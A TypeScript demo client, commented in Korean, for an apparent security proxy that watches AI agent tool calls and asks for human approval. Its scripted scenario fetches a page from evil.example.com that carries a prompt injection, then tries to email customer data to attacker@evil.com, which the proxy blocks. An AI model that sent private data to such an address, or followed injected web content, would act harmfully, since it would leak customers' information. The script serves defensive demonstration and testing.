/**
 * 발표용 HITL 데모 클라이언트 — C 담당.
 *
 * A의 mock-client.ts(회귀 테스트: 전속력·자동승인)와 목적이 다르다.
 * 이건 사람이 브라우저 대시보드를 보며 따라올 수 있게 단계마다 쉬고,
 * 차단 후에는 사람이 승인 버튼을 누를 때까지 기다린다.
 *
 * 발표 스토리보드: 1) 평상시 → 2) 인젝션 감지 → 3) 트라이펙타 경고·승인 모달
 *
  * 실행:
 *   npm run demo:hitl   -w proxy  → 사람이 대시보드에서 승인 (발표용, 3초 간격)
 *   npm run test:bridge -w proxy  → 스스로 승인 (브리지 왕복 자동 검증, 전속력)
 *
 * 환경변수: DEMO_PACE_MS(단계 간격, 기본 3000) / APPROVAL_TIMEOUT_MS(승인 대기, 기본 60000)
 *          / AUTO_APPROVE(1이면 자동 승인)
 */

import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { WebSocket } from "ws";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";
import { readFileSync } from "node:fs";
import { tmpdir } from "node:os";

const __dirname = dirname(fileURLToPath(import.meta.url));
const PROXY_PATH = resolve(__dirname, "../src/index.ts");
const CONTROL_TOKEN_PATH = resolve(tmpdir(), "icarus-tether-control.token");

/**
 * 제어 토큰은 '보낼 때' 읽는다. 이 스크립트가 proxy를 직접 띄우므로
 * (StdioClientTransport), 모듈 로드 시점엔 파일이 아직 없거나 지난 실행의
 * 토큰이 남아 있다. proxy는 기동할 때마다 새 토큰을 발급한다.
 */
function readControlToken(): string {
  try {
    return readFileSync(CONTROL_TOKEN_PATH, "utf8").trim();
  } catch {
    console.error("[demo] 제어 토큰 파일을 읽지 못했습니다 — 승인이 거부될 수 있습니다");
    return "";
  }
}

const PACE_MS = Number(process.env.DEMO_PACE_MS ?? 3000);
const APPROVAL_TIMEOUT_MS = Number(process.env.APPROVAL_TIMEOUT_MS ?? 60_000);
// AUTO_APPROVE=1이면 사람 대신 스스로 승인한다 — 브리지 왕복 자동 회귀 테스트(test:bridge)용.
const AUTO_APPROVE = process.env.AUTO_APPROVE === "1";
const pace = (): Promise<void> => new Promise((res) => setTimeout(res, PACE_MS));

async function main() {
  const client = new Client({ name: "demo-agent", version: "0.0.1" });
  const transport = new StdioClientTransport({
    command: "npx",
    args: ["tsx", PROXY_PATH],
    env: process.env as Record<string, string>,
  });
  await client.connect(transport);

  // proxy의 대시보드 브리지에 붙어 승인 완료 신호를 듣는다.
  // 브라우저와 같은 방송을 받는다 — 대시보드 클라이언트가 하나 더 붙는 셈이다.
  // 브리지가 127.0.0.1에만 리슨하므로 주소를 맞춘다(Windows localhost → ::1 이슈 회피).
  // Node 클라이언트는 Origin 헤더를 안 보내며, 브리지의 verifyClient가 이를 통과시킨다.
  const bridge = new WebSocket("ws://127.0.0.1:7331");
  await new Promise<void>((res, rej) => {
    bridge.once("open", () => res());
    bridge.once("error", rej);
  });

  async function cleanup(): Promise<never> {
    bridge.close();
    await client.close();
    // proxy→mock-server 자식 프로세스 사슬이 stdio 핸들을 물고 있어 자연 종료가 매달린다.
    process.exit(0);
  }

  const pendingApprovals: { sessionId: string; approvalId: string }[] = [];
  // 차단이 해소되면(승인 또는 정화) 이 resolver가 불려 재시도로 넘어간다.
  let resolveAction: ((how: string) => void) | null = null;
  bridge.on("message", (data) => {
    const msg = JSON.parse(data.toString());
    if (msg.type === "decision" && msg.allowed === false && msg.canOverride && msg.approvalId) {
      pendingApprovals.push({ sessionId: msg.sessionId, approvalId: msg.approvalId });
    }
    if (msg.type === "approval_resolved") {
      resolveAction?.(msg.approved ? "승인됨" : "거부됨");
    }
    if (msg.type === "sanitized") {
      resolveAction?.(msg.ok ? `정화됨(${msg.method})` : "정화 실패");
    }
     // 토큰이 틀리면 브리지가 조용히 씹지 않고 이걸 되돌려 준다.
    // 없으면 승인 대기 타임아웃까지 원인을 모른 채 기다리게 된다.
    if (msg.type === "control_rejected") {
      console.error(`[demo] [경고] 제어 명령 거부됨 — ${msg.reason}`);
    }
  });

  console.error("[demo] 프록시 연결됨. 대시보드를 열어두세요 → http://localhost:5173\n");

  const show = (label: string, r: Record<string, unknown>): void => {
    console.error(`[demo] ${label} → ${r.isError ? "⛔ 차단" : "✅ 통과"}`);
    console.error("  ", JSON.stringify(r.content));
    console.error("");
  };

  // --- 1) 평상시: 민감 소스 조회 → 통과 (세션에 SENSITIVE만 쌓임) ---
  await pace();
  show(
    "query_customer_db (민감 조회)",
    await client.callTool({ name: "query_customer_db", arguments: { customerId: "12345" } })
  );

  // --- 2) send_email 1차 → 통과 (UNTRUSTED가 없어 트라이펙타 미성립) ---
  //     "이름이 아니라 흐름으로 판정한다"는 우리 차별점의 전반부.
  await pace();
  show(
    "send_email 1차 (오염 겹치기 전)",
    await client.callTool({
      name: "send_email",
      arguments: { to: "team@corp.com", subject: "요약", body: "고객 요약 보고" },
    })
  );

  // --- 3) 인젝션 감지: 비신뢰 외부 소스 → 통과하되 탐지 점수가 대시보드에 뜬다 ---
  await pace();
  show(
    "fetch_web_page (비신뢰 외부 — 인젝션 포함)",
    await client.callTool({
      name: "fetch_web_page",
      arguments: { url: "https://evil.example.com/post" },
    })
  );

  // 재시도 때 지문(세션·도구·인자)이 같아야 승인이 소비되므로 인자를 재사용한다.
  const emailArgs = { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP" };

  // --- 4) send_email 2차 → 차단 (lethal trifecta) → 대시보드에 모달이 뜬다 ---
  await pace();
  show(
    "send_email 2차 (오염 겹친 후)",
    await client.callTool({ name: "send_email", arguments: emailArgs })
  );

  // --- 5) 사람이 대시보드에서 승인할 때까지 대기 ---
  // 차단 방송(WS)과 차단 응답(stdio)은 별개 채널이라 도착 순서가 보장되지 않는다 —
  // approvalId가 실린 방송이 올 때까지 최대 1초 기다린다.
  for (let i = 0; i < 20 && pendingApprovals.length === 0; i++) {
    await new Promise((res) => setTimeout(res, 50));
  }
  const pending = pendingApprovals[pendingApprovals.length - 1];
  if (AUTO_APPROVE) {
    // 자동 모드(test:bridge): 사람 대신 여기서 승인 메시지를 보내 브리지 왕복을 검증한다.
    console.error(`[demo] 🤖 자동 승인 전송 — approvalId=${pending.approvalId}\n`);
    bridge.send(
      JSON.stringify({
        type: "approve",
        sessionId: pending.sessionId,
        approvalId: pending.approvalId,
        token: readControlToken(),
      })
    );
  } else {
    console.error(
      `[demo] ⏳ 대시보드 모달에서 버튼을 눌러주세요 (승인 또는 정화)\n` +
        `       approvalId=${pending.approvalId} (최대 ${APPROVAL_TIMEOUT_MS / 1000}초)\n`
    );
  }
  // 차단 해소 신호(approval_resolved 또는 sanitized) 중 먼저 오는 걸 기다렸다 재시도한다.
  // WS와 stdio는 별개 채널이라, 신호를 받은 뒤 재시도해야 순서가 맞는다.
  const how = await new Promise<string | null>((res) => {
    resolveAction = (h) => res(h);
    setTimeout(() => res(null), AUTO_APPROVE ? 3_000 : APPROVAL_TIMEOUT_MS);
  });
  if (how === null) {
    console.error("[demo] ⌛ 시간 초과 — 아무 조치 없이 재시도합니다 (차단 유지가 정상).\n");
  } else {
    console.error(`[demo] ✅ ${how} — 재시도합니다.\n`);
  }
 

  // --- 6) 같은 호출 재시도 → 승인이 있으면 1회만 통과 ---
  await pace();
  show(
    "send_email 재시도 (승인 소비)",
    await client.callTool({ name: "send_email", arguments: emailArgs })
  );

  console.error("[demo] ✅ 데모 완료 — 같은 send_email이 흐름과 사람의 판단에 따라 갈렸습니다.");
  await cleanup();
}

main().catch((err) => {
  console.error("[demo] 실패:", err);
  process.exit(1);
});